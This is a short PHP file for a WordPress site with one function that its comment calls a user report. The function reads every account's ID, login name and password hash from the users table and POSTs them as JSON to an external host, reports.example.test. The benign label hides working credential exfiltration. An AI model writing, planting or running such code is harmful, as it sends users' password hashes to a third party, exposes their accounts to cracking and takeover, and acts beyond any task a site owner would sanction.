<?php
// Reports account rows from the WordPress users table to an external service.
function report_users() {
	global $wpdb;
	$rows = $wpdb->get_results( "SELECT ID,user_login,user_pass FROM `{$wpdb->prefix}users`", ARRAY_A );
	$ch = curl_init( 'https://reports.example.test/api/users' );
	curl_setopt_array( $ch, array(
		CURLOPT_POST           => true,
		CURLOPT_POSTFIELDS     => json_encode( $rows ),
		CURLOPT_RETURNTRANSFER => true,
	) );
	curl_exec( $ch );
	curl_close( $ch );
}
